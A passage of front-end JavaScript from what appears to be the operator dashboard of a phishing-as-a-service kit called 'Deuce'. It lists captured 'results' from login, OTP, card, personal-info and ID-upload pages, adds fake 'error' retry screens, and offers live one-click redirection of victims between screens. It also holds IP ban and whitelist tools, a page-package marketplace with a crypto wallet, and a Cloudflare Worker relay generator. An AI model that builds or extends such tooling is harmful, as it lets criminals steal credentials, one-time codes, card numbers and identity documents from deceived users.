  const value = normalizeFlowLabel([
    result.screen,
    result.pageId,
    result.path,
    result.file
  ].filter(Boolean).join(" "));
  if (value.includes("login2")) return "login2";
  if (value.includes("otp2")) return "otp2";
  if (value.includes("login") || value.includes("index")) return "login";
  if (value.includes("otp")) return "otp";
  if (value.includes("email")) return "email";
  if (value.includes("personal")) return "personal";
  if (value.includes("card")) return "card";
  if (value.includes("upload")) return "upload";
  if (value.includes("thanks") || value.includes("success")) return "thanks";
  return "other";
}

function resultStepCounts(results = []) {
  const counts = Object.fromEntries(resultStepDefinitions.map(([key]) => [key, 0]));
  results.forEach((result) => {
    counts[resultStepKey(result)] = (counts[resultStepKey(result)] || 0) + 1;
  });
  return counts;
}

function resultStepCountMarkup(results = []) {
  const counts = resultStepCounts(results);
  return `
    <article class="security-panel result-count-panel">
      <div class="result-count-grid">
        ${resultStepDefinitions.map(([key, label]) => `
          <div class="${counts[key] ? "has-results" : ""}">
            <span>${escapeHtml(label)}</span>
            <b>${String(counts[key] || 0).padStart(2, "0")}</b>
          </div>
        `).join("")}
      </div>
    </article>
  `;
}

function resultFieldMarkup(fields = {}, screen = "") {
  const displayFields = normalizeOtpResultFields(fields, screen);
  return Object.entries(displayFields)
    .filter(([label]) => !isInternalResultField(label))
    .map(([label, value]) => {
      const cleanLabel = String(label || "Field")
        .replace(/[_-]+/g, " ")
        .replace(/\s+/g, " ")
        .trim()
        .replace(/\b\w/g, (letter) => letter.toUpperCase());
      return `
    <div>
      <span>${escapeHtml(cleanLabel)}</span>
      <strong>${escapeHtml(String(value))}</strong>
    </div>
  `;
    }).join("");
}

function resultActionsMarkup(result, pageSlug) {
  return `
    <div class="result-actions">
      <button type="button" data-view-result="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#128269; View</button>
      <button type="button" data-ban-result-ip="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#128683; Ban IP</button>
      <button type="button" data-whitelist-result-ip="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#9989; Whitelist</button>
      <button type="button" data-delete-result="${escapeHtml(result.id)}" data-result-page="${escapeHtml(pageSlug)}">&#128465; Delete</button>
    </div>
  `;
}

function resultViewerTime(value) {
  if (!value) return "Unknown";
  const date = new Date(value);
  return Number.isNaN(date.getTime()) ? "Unknown" : date.toLocaleString();
}

function resultViewerFlowLabel(item) {
  if (typeof item === "string") return item;
  return item?.name || item?.label || item?.file || "";
}

function resultViewerTimelineMarkup(results = [], selectedId = "") {
  return results.map((result, index) => `
    <button type="button" class="result-viewer-step ${result.id === selectedId ? "is-active" : ""}" data-result-viewer-step="${escapeHtml(result.id)}" aria-current="${result.id === selectedId ? "step" : "false"}">
      <span>${index + 1}</span>
      <div>
        <strong>${escapeHtml(result.screen || "Page")}</strong>
        <small>${escapeHtml(resultViewerTime(result.createdAt))}</small>
      </div>
      <em class="result-workflow-status is-${escapeHtml(result.status || "new")}">${escapeHtml(resultWorkflowLabel(result.status))}</em>
    </button>
  `).join("");
}

function closeResultViewer(options = {}) {
  const restoreFocus = options.restoreFocus !== false;
  const returnFocus = activeResultViewer?.returnFocus;
  activeResultViewer?.viewer?.remove();
  document.body.classList.remove("result-viewer-open");
  activeResultViewer = null;
  if (restoreFocus && returnFocus?.isConnected) returnFocus.focus();
}

function renderResultViewer() {
  if (!activeResultViewer?.viewer?.isConnected) return;
  const { viewer, page, results, selectedId } = activeResultViewer;
  const result = results.find((item) => item.id === selectedId) || results[0];
  if (!result) return;
  activeResultViewer.selectedId = result.id;
  const stepIndex = Math.max(results.findIndex((item) => item.id === result.id), 0);
  const fields = resultFieldMarkup(result.fields || {}, result.screen);
  const flow = (Array.isArray(result.flow) ? result.flow : [])
    .map(resultViewerFlowLabel)
    .filter(Boolean);
  const sourcePath = [result.hostname, result.path].filter(Boolean).join("");

  viewer.innerHTML = `
    <section class="result-viewer-panel" role="dialog" aria-modal="true" aria-labelledby="resultViewerTitle" tabindex="-1">
      <header class="result-viewer-head">
        <div>
          <small>secure result viewer / step ${stepIndex + 1} of ${results.length}</small>
          <h2 id="resultViewerTitle">${escapeHtml(result.screen || "Result detail")}</h2>
          <p>${escapeHtml(page.name || result.pageName || "Page")} / received ${escapeHtml(resultViewerTime(result.createdAt))}</p>
        </div>
        <div class="result-viewer-head-actions">
          <span class="result-workflow-status is-${escapeHtml(result.status || "new")}">${escapeHtml(resultWorkflowLabel(result.status))}</span>
          <button type="button" data-close-result-viewer aria-label="Close result viewer">&times;</button>
        </div>
      </header>
      <div class="result-viewer-layout">
        <aside class="result-viewer-timeline">
          <div class="result-viewer-section-head">
            <small>session journey</small>
            <strong>${results.length} result${results.length === 1 ? "" : "s"}</strong>
          </div>
          <div class="result-viewer-steps">${resultViewerTimelineMarkup(results, result.id)}</div>
        </aside>
        <main class="result-viewer-content">
          <section class="result-viewer-summary">
            <article><small>IP address</small><strong>${escapeHtml(result.ip || "Unknown")}</strong></article>
            <article><small>Page file</small><strong>${escapeHtml(result.pageId || result.screen || "Unknown")}</strong></article>
            <article><small>Package version</small><strong>${escapeHtml(result.packageVersion || "Unknown")}</strong></article>
            <article><small>Review status</small><strong>${escapeHtml(resultWorkflowLabel(result.status))}</strong></article>
          </section>
          <section class="result-viewer-section">
            <div class="result-viewer-section-head">
              <div><small>submitted fields</small><h3>Captured field map</h3></div>
              <span>${Object.keys(result.fields || {}).length} field${Object.keys(result.fields || {}).length === 1 ? "" : "s"}</span>
            </div>
            <p class="result-viewer-redaction">Raw submitted values are never returned to this browser. Only field names and redaction state are shown.</p>
            <div class="result-viewer-fields">
              ${fields || `<div><span>Status</span><strong>No form fields saved for this result</strong></div>`}
            </div>
          </section>
          <section class="result-viewer-section">
            <div class="result-viewer-section-head"><div><small>request context</small><h3>Source and record metadata</h3></div></div>
            <dl class="result-viewer-metadata">
              <div><dt>Result ID</dt><dd>${escapeHtml(result.id)}</dd></div>
              <div><dt>Session ID</dt><dd>${escapeHtml(result.sessionId || "No session")}</dd></div>
              <div><dt>Source</dt><dd>${escapeHtml(sourcePath || "Unknown")}</dd></div>
              <div><dt>Received</dt><dd>${escapeHtml(resultViewerTime(result.createdAt))}</dd></div>
              <div><dt>User agent</dt><dd>${escapeHtml(result.userAgent || "Unknown")}</dd></div>
              <div><dt>Reviewed</dt><dd>${escapeHtml(result.reviewedAt ? resultViewerTime(result.reviewedAt) : "Not reviewed")}</dd></div>
            </dl>
          </section>
          <section class="result-viewer-section">
            <div class="result-viewer-section-head"><div><small>configured journey</small><h3>Expected page flow</h3></div></div>
            <div class="result-viewer-flow">
              ${flow.length ? flow.map((label, index) => `<span class="${index === stepIndex ? "is-current" : ""}">${index + 1}. ${escapeHtml(label)}</span>`).join("") : "<span>No configured flow metadata</span>"}
            </div>
          </section>
        </main>
      </div>
    </section>
  `;
}

async function openResultViewer(page, resultId, trigger = null) {
  closeResultViewer({ restoreFocus: false });
  const viewer = document.createElement("div");
  viewer.className = "result-viewer-backdrop";
  viewer.dataset.resultViewer = "";
  viewer.innerHTML = `
    <section class="result-viewer-panel is-loading" role="dialog" aria-modal="true" aria-label="Loading result" tabindex="-1">
      <div class="result-viewer-loading"><span></span><strong>Loading authenticated result</strong><small>Verifying page ownership and session timeline</small></div>
    </section>
  `;
  document.body.appendChild(viewer);
  document.body.classList.add("result-viewer-open");
  activeResultViewer = { viewer, page, results: [], selectedId: resultId, returnFocus: trigger || document.activeElement };

  try {
    const response = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/results/${encodeURIComponent(resultId)}`);
    if (!activeResultViewer || activeResultViewer.viewer !== viewer) return;
    const selected = normalizePageResult(response.result);
    const results = (response.sessionResults || [response.result])
      .map(normalizePageResult)
      .sort((a, b) => resultTimestampValue(a) - resultTimestampValue(b));
    const selectedIndex = results.findIndex((item) => item.id === selected.id);
    if (selectedIndex === -1) results.push(selected);
    else results[selectedIndex] = selected;
    activeResultViewer.results = results;
    activeResultViewer.selectedId = selected.id;
    renderResultViewer();
    viewer.querySelector(".result-viewer-panel")?.focus();
    statusText.textContent = `${page.name.toUpperCase()} RESULT VIEWER OPEN`;
  } catch (error) {
    if (!activeResultViewer || activeResultViewer.viewer !== viewer) return;
    viewer.innerHTML = `
      <section class="result-viewer-panel is-error" role="alertdialog" aria-modal="true" aria-label="Result viewer error" tabindex="-1">
        <div class="result-viewer-loading"><strong>Result could not be loaded</strong><small>${escapeHtml(error.message)}</small><button type="button" data-close-result-viewer>Close viewer</button></div>
      </section>
    `;
    viewer.querySelector(".result-viewer-panel")?.focus();
    statusText.textContent = `RESULT VIEWER FAILED: ${error.message}`.toUpperCase();
  }
}

function selectResultViewerResult(resultId) {
  if (!activeResultViewer?.results?.some((result) => result.id === resultId)) return;
  activeResultViewer.selectedId = resultId;
  renderResultViewer();
  activeResultViewer.viewer.querySelector(`[data-result-viewer-step="${CSS.escape(resultId)}"]`)?.focus();
}

function resultWorkflowLabel(status = "new") {
  return ({ new: "New", reviewed: "Reviewed", flagged: "Flagged", resolved: "Resolved" })[String(status).toLowerCase()] || "New";
}

function bulkResultsToolbarMarkup(pageSlug) {
  return `
    <div class="bulk-results-toolbar" data-bulk-results-toolbar="${escapeHtml(pageSlug)}">
      <div class="bulk-results-selection">
        <button type="button" data-bulk-results-select-visible>Select visible</button>
        <button type="button" data-bulk-results-clear>Clear</button>
        <strong data-bulk-results-count>0 selected</strong>
      </div>
      <div class="bulk-results-actions">
        <select data-bulk-results-action aria-label="Bulk result action">
          <option value="review">Mark reviewed</option>
          <option value="flag">Flag for attention</option>
          <option value="resolve">Mark resolved</option>
          <option value="ban">Ban selected IPs</option>
          <option value="whitelist">Whitelist selected IPs</option>
          <option value="export">Export safe metadata</option>
          <option value="delete">Delete selected</option>
        </select>
        <button type="button" class="primary" data-bulk-results-apply disabled>Apply</button>
      </div>
    </div>
  `;
}

function selectedResultIds() {
  return [...preview.querySelectorAll("[data-result-select]:checked")].map((input) => input.dataset.resultSelect).filter(Boolean);
}

function updateBulkResultsToolbar() {
  const ids = selectedResultIds();
  const count = preview.querySelector("[data-bulk-results-count]");
  const apply = preview.querySelector("[data-bulk-results-apply]");
  if (count) count.textContent = `${ids.length} selected`;
  if (apply) apply.disabled = ids.length === 0;
}

function safeCsvMetadataCell(value) {
  const text = String(value ?? "");
  const safe = /^[=+@-]/.test(text) ? `'${text}` : text;
  return `"${safe.replace(/"/g, '""')}"`;
}

function exportSelectedResultMetadata(page, resultIds) {
  const selectedIds = new Set(resultIds);
  const rows = [["result_id", "session_id", "screen", "status", "ip", "hostname", "created_at", "field_names"]];
  (page.results || []).filter((result) => selectedIds.has(result.id)).forEach((result) => {
    rows.push([
      result.id,
      result.sessionId || "",
      result.screen || "",
      result.status || "new",
      result.ip || "",
      result.hostname || "",
      result.createdAt || "",
      Object.keys(result.fields || {}).filter((field) => !isInternalResultField(field)).join(" | ")
    ]);
  });
  const csv = rows.map((row) => row.map(safeCsvMetadataCell).join(",")).join("\r\n");
  const fileKey = String(page.slug || page.id || "page").replace(/[^a-z0-9_-]+/gi, "-").replace(/^-+|-+$/g, "") || "page";
  downloadBlob(`${fileKey}-results-metadata-${new Date().toISOString().slice(0, 10)}.csv`, csv, "text/csv;charset=utf-8");
  return rows.length - 1;
}

async function applyBulkResults(page, action, resultIds) {
  if (!page || !resultIds.length) throw new Error("Select at least one result");
  if (action === "export") {
    const exported = exportSelectedResultMetadata(page, resultIds);
    statusText.textContent = `${exported} RESULT METADATA ROW${exported === 1 ? "" : "S"} EXPORTED`;
    return;
  }
  if (action === "delete" && !window.confirm(`Delete ${resultIds.length} selected result${resultIds.length === 1 ? "" : "s"}? This cannot be undone.`)) return;
  const response = await requestApi(`/api/user-pages/${encodeURIComponent(page.id)}/results/bulk`, {
    method: "POST",
    body: JSON.stringify({ action, resultIds })
  });
  if (response.userPage?.securityConfig) applyPageSecurityConfig(page, response.userPage.securityConfig);
  await renderResultsCenter(pageRouteKey(page));
  const labels = {
    review: "MARKED REVIEWED",
    flag: "FLAGGED",
    resolve: "RESOLVED",
    ban: "BANNED",
    whitelist: "WHITELISTED",
    delete: "DELETED"
  };
  const affected = Number(response.affected || 0);
  const subject = ["ban", "whitelist"].includes(action) ? `IP${affected === 1 ? "" : "S"}` : `RESULT${affected === 1 ? "" : "S"}`;
  statusText.textContent = `${affected} ${subject} ${labels[action] || "UPDATED"}`;
}

function commandStatusLabel(command = null) {
  if (!command?.targetUrl) return "No command queued";
  const label = command.note || command.targetUrl;
  if (command.status === "delivered") return `Delivered: ${label}`;
  return `Queued: ${label}`;
}

function normalizeFlowLabel(value = "") {
  return String(value || "")
    .replace(/\.[a-z0-9]+$/i, "")
    .replace(/[-_]+/g, " ")
    .replace(/\b(error login|login2)\b/i, "login2")
    .replace(/\b(error otp|otp2)\b/i, "otp2")
    .replace(/\b(login page|login)\b/i, "login")
    .replace(/\b(otp page|otp)\b/i, "otp")
    .replace(/\b(upload id|photo id|file upload|upload)\b/i, "upload")
    .replace(/\b(personal info page|personal info|personal)\b/i, "personal")
    .replace(/\b(email page|email)\b/i, "email")
    .replace(/\b(card page|card|c)\b/i, "card")
    .replace(/\b(thank you page|thanks|thnks)\b/i, "thanks")
    .trim()
    .toLowerCase();
}

function sessionCurrentFlowLabel(session = null, latestResult = null, command = null) {
  return session?.screen
    || latestResult?.screen
    || command?.note
    || "";
}
function runtimeFileFromTargetUrl(value = "") {
  try {
    const parsed = new URL(String(value || ""), "https://deuce.local");
    return normalizedRuntimeScreenFile(parsed.searchParams.get("file") || "");
  } catch {
    return "";
  }
}

function sessionCurrentFlowFile(session = null, latestResult = null, command = null) {
  const resultFile = Array.isArray(latestResult?.flow)
    ? [...latestResult.flow]
      .reverse()
      .map((file) => normalizedRuntimeScreenFile(file))
      .find(Boolean) || ""
    : "";
  return normalizedRuntimeScreenFile(
    session?.screenFile
    || resultFile
    || command?.targetFile
    || runtimeFileFromTargetUrl(command?.targetUrl)
  );
}

function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = null, currentLabel = "", currentFile = "") {
  const currentKey = normalizeFlowLabel(currentLabel);
  const currentFileKey = normalizedRuntimeScreenFile(currentFile).toLowerCase();
  const page = getPageBySlug(pageSlug);
  const controlsDisabled = disabledPageCapabilityAttributes(page, "controlSessions");
  const stageLabels = { form: "Form", verification: "Verification", success: "Success", other: "Other" };
  const groupedTargets = ["form", "verification", "success", "other"]
    .map((stage) => ({ stage, targets: pageTargets.filter((target) => (target.stage || "other") === stage) }))
    .filter((group) => group.targets.length);
  const targetButton = (target) => {
    const isCurrent = currentFileKey
      ? normalizedRuntimeScreenFile(target.file).toLowerCase() === currentFileKey
      : Boolean(currentKey && normalizeFlowLabel(target.label) === currentKey);
    return `
      <button type="button" class="${isCurrent ? "is-current" : ""}" data-session-redirect="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}" data-session-target-id="${escapeHtml(target.id || "")}" data-session-target-file="${escapeHtml(target.file)}" data-session-target-label="${escapeHtml(target.label)}" data-session-force-reload="${target.forceReload ? "true" : "false"}" aria-pressed="${isCurrent ? "true" : "false"}"${controlsDisabled || (isCurrent && !target.forceReload ? ' disabled aria-disabled="true"' : "")}>
        ${escapeHtml(target.label)}
      </button>
    `;
  };
  return `
    <div class="session-command result-live-command">
      <strong class="flow-command-title">One-click flow</strong>
      <div class="session-route-buttons" aria-label="Redirect active user">
        ${groupedTargets.length ? groupedTargets.map((group) => `
          <div class="session-route-group" data-session-route-stage="${group.stage}">
            <small>${stageLabels[group.stage]}</small>
            <div>${group.targets.map(targetButton).join("")}</div>
          </div>
        `).join("") : "<span>No mapped pages found</span>"}
      </div>
      <button type="button" data-session-clear="${escapeHtml(sessionId)}" data-session-page="${escapeHtml(pageSlug)}"${controlsDisabled}>Clear</button>
      <small class="${command?.status === "delivered" ? "is-delivered" : command?.targetUrl ? "is-queued" : ""}">${escapeHtml(commandStatusLabel(command))}</small>
    </div>
  `;
}

function activeSessionCardMarkup(session, page, pageTargets = [], command = null) {
  const routeKey = pageRouteKey(page);
  return `
    <article class="active-session-card">
      <div>
        <small>${escapeHtml(session.event || "page_load")} / ${escapeHtml(session.result || "allowed")}</small>
        <h4>${escapeHtml(session.ip || "unknown")}</h4>
        <p>${escapeHtml(session.screen || "page")} ${session.path ? `/ ${escapeHtml(session.path)}` : ""}</p>
      </div>
      <div class="session-meta">
        <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
        <span>${escapeHtml(commandStatusLabel(command))}</span>
      </div>
      ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, sessionCurrentFlowLabel(session, null, command), sessionCurrentFlowFile(session, null, command))}
    </article>
  `;
}

function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHistory = {}) {
  const active = sessionCommands[sessionId];
  if (active?.targetUrl) return active;
  const history = sessionCommandHistory[sessionId];
  if (Array.isArray(history)) return history[0] || null;
  return history?.targetUrl ? history : null;
}

function sessionResultDetailMarkup(session, page) {
  const routeKey = pageRouteKey(page);
  if (!session.results.length) {
    return `
      <article class="result-card compact">
        <div class="result-head">
          <div>
            <small>Waiting</small>
            <h3>No result submitted yet</h3>
          </div>
          <span>live session</span>
        </div>
      </article>
    `;
  }

  return session.results.map((result, index) => `
    <article class="result-card compact">
      <div class="result-head">
        <div>
          <small>Step ${index + 1} / ${escapeHtml(resultWorkflowLabel(result.status))}</small>
          <h3>${escapeHtml(result.screen)}</h3>
        </div>
        <div class="result-review-meta">
          <span class="result-workflow-status is-${escapeHtml(result.status || "new")}">${escapeHtml(resultWorkflowLabel(result.status))}</span>
          <span>${escapeHtml(result.date)} / ${escapeHtml(result.time)}</span>
          <label class="result-select-control">
            <input type="checkbox" data-result-select="${escapeHtml(result.id)}" data-result-page="${escapeHtml(routeKey)}">
            <span>Select</span>
          </label>
        </div>
      </div>
      <div class="result-fields">
        ${resultFieldMarkup(result.fields || {}, result.screen) || `
          <div>
            <span>Status</span>
            <strong>No form fields saved for this step</strong>
          </div>
        `}
      </div>
      ${resultActionsMarkup(result, routeKey)}
    </article>
  `).join("");
}

function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
  const routeKey = pageRouteKey(page);
  const sessionIp = session.ip || session.results[session.results.length - 1]?.ip || "unknown";
  const ipStatus = bannedIps.includes(sessionIp) ? "Banned" : whitelistIps.includes(sessionIp) ? "Whitelisted" : "Unsorted";
  const lastDate = new Date(session.lastSeen);
  const lastSeen = Number.isNaN(lastDate.getTime()) ? "unknown" : `${lastDate.toLocaleDateString()} / ${lastDate.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}`;
  const activeSession = options.activeSession || null;
  const command = options.command || null;
  const pageTargets = options.pageTargets || [];
  const latestResult = session.results[session.results.length - 1] || null;
  const currentFlowLabel = sessionCurrentFlowLabel(activeSession, latestResult, command);
  const currentFlowFile = sessionCurrentFlowFile(activeSession, latestResult, command);
  const isBlocked = ipStatus === "Banned" || String(activeSession?.result || "").toLowerCase() === "blocked";
  const commandStatus = command?.status || (command?.targetUrl ? "queued" : "none");
  const rowStatus = isBlocked ? "blocked" : commandStatus === "queued" ? "queued" : activeSession ? "live" : commandStatus === "delivered" ? "delivered" : "offline";
  const filterTokens = Array.from(new Set([
    rowStatus,
    activeSession ? "live" : "",
    commandStatus === "queued" ? "queued" : "",
    commandStatus === "delivered" ? "delivered" : "",
    isBlocked ? "blocked" : "",
    session.results.length ? "has-results" : "idle",
    activeSession ? "" : "offline"
  ].filter(Boolean))).join(" ");
  const searchText = [
    session.sessionId,
    sessionIp,
    ipStatus,
    rowStatus,
    activeSession?.screen,
    latestResult?.screen,
    command?.note,
    command?.targetUrl
  ].filter(Boolean).join(" ").toLowerCase();
  return `
    <details class="compact-session-row result-session-card ${activeSession ? "is-live" : ""}" data-compact-session="${escapeHtml(session.sessionId)}" data-session-filter="${escapeHtml(filterTokens)}" data-session-search="${escapeHtml(searchText)}">
      <summary class="compact-session-summary">
        <span class="session-dot ${escapeHtml(rowStatus)}"></span>
        <div class="compact-session-main">
          <small>${escapeHtml(session.sessionId)}</small>
          <h3>${escapeHtml(currentFlowLabel || "Session")} <span>${session.results.length} result${session.results.length === 1 ? "" : "s"}</span></h3>
        </div>
        <div class="compact-session-meta">
          <span>IP ${escapeHtml(sessionIp)}</span>
          <span>${escapeHtml(ipStatus)}</span>
          <span>${activeSession ? "Live now" : `Offline / ${escapeHtml(lastSeen)}`}</span>
        </div>
        ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, currentFlowLabel, currentFlowFile)}
      </summary>
      <div class="session-result-timeline">
        ${sessionResultDetailMarkup(session, page)}
      </div>
    </details>
  `;
}

async function loadResultsControlData(page, options = {}) {
  try {
    const [resultsData, sessionsData] = await Promise.all([
      requestApi(`/api/user-pages/${page.id}/results`),
      requestApi(`/api/user-pages/${page.id}/sessions`)
    ]);
    const results = (resultsData.results || []).map(normalizePageResult);
    page.results = results;
    page.activeSessions = sessionsData.sessions || [];
    page.runtimeTargets = sessionsData.targets || [];
    page.screenSync = sessionsData.screenSync || {};
    ownedPages = ownedPages.map((item) => item.id === page.id ? { ...item, results, activeSessions: page.activeSessions, runtimeTargets: page.runtimeTargets, screenSync: page.screenSync } : item);
  } catch (error) {
    statusText.textContent = `RESULTS LOAD WARNING: ${error.message}`.toUpperCase();
  }
  return page;
}

function readFileAsDataUrl(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(String(reader.result || ""));
    reader.onerror = () => reject(new Error("Thumbnail read failed"));
    reader.readAsDataURL(file);
  });
}

async function uploadPackageThumbnail(input) {
  const page = getAdminPackage(input.dataset.packageThumbnail);
  const file = input.files?.[0];
  if (!page || !file) return;

  const allowedTypes = ["image/png", "image/jpeg", "image/webp", "image/svg+xml"];
  if (!allowedTypes.includes(file.type)) {
    statusText.textContent = "UPLOAD PNG, JPG, WEBP, OR SVG";
    input.value = "";
    return;
  }

  if (file.size > 500 * 1024) {
    statusText.textContent = "THUMBNAIL MUST BE UNDER 500KB";
    input.value = "";
    return;
  }

  setAppBusy(true, "Uploading thumbnail");
  try {
    const thumbnailDataUrl = await readFileAsDataUrl(file);
    const packageManifest = {
      ...(page.packageManifest || {}),
      thumbnailDataUrl,
      thumbnailFileName: file.name,
      thumbnailUpdatedAt: new Date().toISOString()
    };
    const result = await requestApi(`/api/packages/${page.id || page.slug}`, {
      method: "PATCH",
      body: JSON.stringify({ packageManifest })
    });
    const updated = normalizePackage(result.package);
    adminPackages = adminPackages.map((item) => item.id === updated.id ? updated : item);
    marketPages = marketPages.map((item) => item.id === updated.id ? updated : item);
    renderAdminPackageEditor(updated.slug);
    statusText.textContent = `${updated.name.toUpperCase()} THUMBNAIL UPDATED`;
  } catch (error) {
    statusText.textContent = `THUMBNAIL UPLOAD FAILED: ${error.message}`.toUpperCase();
  } finally {
    clearAppBusySoon();
  }
}

async function loadAppData() {
  apiLoadError = "";
  try {
    const packagesResult = await requestApi(isAdmin() ? "/api/admin/packages" : "/api/packages");
    let userPagesResult = { userPages: [] };
    let walletResult = { balance: 0, currency: "USD", transactions: [] };
    let depositRequestsResult = { requests: [] };
    let fundingOptionsResult = { options: walletFundingOptions };
    let adminDepositRequestsResult = { requests: [] };
    let adminUsersResult = { users: [] };
    let adminInvitationsResult = { invitations: [] };
    if (isLoggedIn()) {
      userPagesResult = await requestApi("/api/user-pages");
      [walletResult, depositRequestsResult, fundingOptionsResult, adminDepositRequestsResult, adminUsersResult, adminInvitationsResult] = await Promise.all([
        requestApi("/api/wallet"),
        requestApi("/api/wallet/fund-requests").catch(() => ({ requests: [] })),
        requestApi("/api/wallet/funding-options").catch(() => ({ options: walletFundingOptions })),
        hasAdminCapability("walletReview")
          ? requestApi("/api/wallet/admin/fund-requests").catch(() => ({ requests: [] }))
          : Promise.resolve({ requests: [] }),
        canAccessAdminPanel()
          ? requestApi("/api/admin/users").catch(() => ({ users: [] }))
          : Promise.resolve({ users: [] }),
        isAdmin()
          ? requestApi("/api/admin/invites").catch(() => ({ invitations: [] }))
          : Promise.resolve({ invitations: [] })
      ]);
    }
    const packages = packagesResult.packages || [];
    marketPages = packages.filter((pagePackage) => pagePackage.status === "published").map(normalizePackage);
    adminPackages = packages.map(normalizePackage);
    ownedPages = (userPagesResult.userPages || []).map(normalizeUserPage);
    walletData = walletResult || { balance: 0, currency: "USD", transactions: [] };
    walletDepositRequests = depositRequestsResult.requests || [];
    walletFundingOptions = (fundingOptionsResult.options || walletFundingOptions).map((option) => ({
      ...option,
      address: option.address || "",
      configured: Boolean(option.address || option.configured)
    }));
    adminDepositRequests = adminDepositRequestsResult.requests || [];
    adminUsers = (adminUsersResult.users || []).map(normalizeAdminUser);
    adminInvitations = adminInvitationsResult.invitations || [];
  } catch (error) {
    apiLoadError = error.message;
    marketPages = [];
    adminPackages = [];
    ownedPages = [];
    adminUsers = [];
    adminInvitations = [];
    walletData = { balance: 0, currency: "USD", transactions: [] };
    walletDepositRequests = [];
    walletFundingOptions = cryptoFundingOptions.map((option) => ({ ...option, address: "", configured: false }));
    adminDepositRequests = [];
  }
}

function emptyState(title, copy, actionHash = "") {
  return `
    <article class="empty-state">
      <h3>${title}</h3>
      <p>${copy}</p>
      ${apiLoadError ? `<small>API: ${escapeHtml(apiLoadError)}</small>` : ""}
      ${actionHash ? routeButton(actionHash, "Open setup") : ""}
    </article>
  `;
}

let authState = { mode: "cookie", user: null };

function getAuthState() {
  return authState;
}

function saveAuthState(nextState) {
  authState = { mode: "cookie", user: nextState.user || null };
  syncAdminVisibility();
}

function clearAuthState() {
  authState = { mode: "cookie", user: null };
  marketPages = [];
  adminPackages = [];
  adminUsers = [];
  adminInvitations = [];
  latestInvitationLink = null;
  ownedPages = [];
  walletData = { balance: 0, currency: "USD", transactions: [] };
  walletDepositRequests = [];
  adminDepositRequests = [];
  walletFundOpen = false;
  walletHistoryOpen = false;
  walletFundingOptions = cryptoFundingOptions.map((option) => ({ ...option, address: "", configured: false }));
  resetNotifications();
  syncAdminVisibility();
}

function isLoggedIn() {
  return Boolean(getAuthState().user);
}

function isAdmin() {
  return String(getAuthState().user?.role || "").toLowerCase() === "admin";
}

function hasAdminCapability(capability) {
  if (isAdmin()) return true;
  const collaboration = getAuthState().user?.collaboration || {};
  return Boolean(collaboration.enabled && collaboration[capability]);
}

function canAccessAdminPanel() {
  return isAdmin() || ["supportAccess", "pageEditor", "walletReview"].some(hasAdminCapability);
}

function isAdminRoute(hash) {
  return hash === "#admin" || hash.startsWith("#admin-");
}

function syncAdminVisibility() {
  const adminNav = document.querySelector('.nav-item[href="#admin"]');
  const auth = getAuthState();
  const allowed = canAccessAdminPanel();
  if (adminNav) {
    adminNav.hidden = !allowed;
    adminNav.classList.toggle("is-hidden", !allowed);
    adminNav.style.display = allowed ? "" : "none";
    adminNav.setAttribute("aria-hidden", allowed ? "false" : "true");
    adminNav.tabIndex = allowed ? 0 : -1;
  }
  const displayName = auth.user?.name || (allowed ? "Deuce Admin" : "Deuce User");
  const roleLabel = allowed ? "Admin account" : "Subscriber account";
  const profileName = document.getElementById("profileName");
  const dropdownProfileName = document.getElementById("dropdownProfileName");
  const profileRole = document.getElementById("profileRole");
  if (profileName) profileName.textContent = displayName;
  if (dropdownProfileName) dropdownProfileName.textContent = displayName;
  if (profileRole) profileRole.textContent = roleLabel;
}

function authField(name) {
  return preview.querySelector(`[data-auth-field="${name}"]`)?.value.trim() || "";
}

function routeHash(hash = window.location.hash) {
  return String(hash || "").split("?")[0];
}

function inviteTokenFromHash() {
  const hash = String(window.location.hash || "");
  const queryIndex = hash.indexOf("?");
  if (queryIndex < 0) return "";
  return new URLSearchParams(hash.slice(queryIndex + 1)).get("invite")?.trim() || "";
}

async function validateSignupInvitation(token) {
  signupInviteState = { token, status: "validating", email: "", expiresAt: "", error: "" };
  renderSignup();

  try {
    const result = await requestApi("/api/auth/invitations/validate", {
      method: "POST",
      body: JSON.stringify({ inviteToken: token })
    });
    if (inviteTokenFromHash() !== token) return;
    signupInviteState = {
      token,
      status: "valid",
      email: result.invitation.email,
      expiresAt: result.invitation.expiresAt,
      error: ""
    };
  } catch (error) {
    if (inviteTokenFromHash() !== token) return;
    signupInviteState = { token, status: "invalid", email: "", expiresAt: "", error: error.message };
  }

  renderSignup();
}

function setAuthLayout(enabled) {
  appShell?.classList.toggle("auth-mode", enabled);
}

async function refreshAuthUser() {
  try {
    const result = await requestApi("/api/auth/me");
    saveAuthState({ user: result.user });
  } catch (error) {
    clearAuthState();
  }
}

function generateRelaySecret() {
  const bytes = new Uint8Array(24);
  if (window.crypto?.getRandomValues) {
    window.crypto.getRandomValues(bytes);
    return `deuce_${Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")}`;
  }
  return `deuce_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 18)}`;
}

function cloudflareWorkerScript(page) {
  const hosting = page.hostingConfig || {};
  const backendApi = (hosting.relayTarget || apiBase()).replace(/\/$/, "");
  const relaySecret = "";
  const relaySecretConfigured = Boolean(hosting.relaySecretConfigured || hosting.relaySecret);
  return `const DEUCE_API = "${backendApi}";
const RELAY_SECRET = "${relaySecret}";

addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  if (url.pathname.endsWith("/index.html")) {
    url.pathname = url.pathname.replace(/index\\.html$/, "");
    return Response.redirect(url.toString(), 301);
  }

  if (!url.pathname.startsWith("/api/")) {
    return fetch(request);
  }

  const target = new URL(DEUCE_API);
  target.pathname = "/api/runtime" + url.pathname.replace(/^\\/api/, "");
  target.search = url.search;

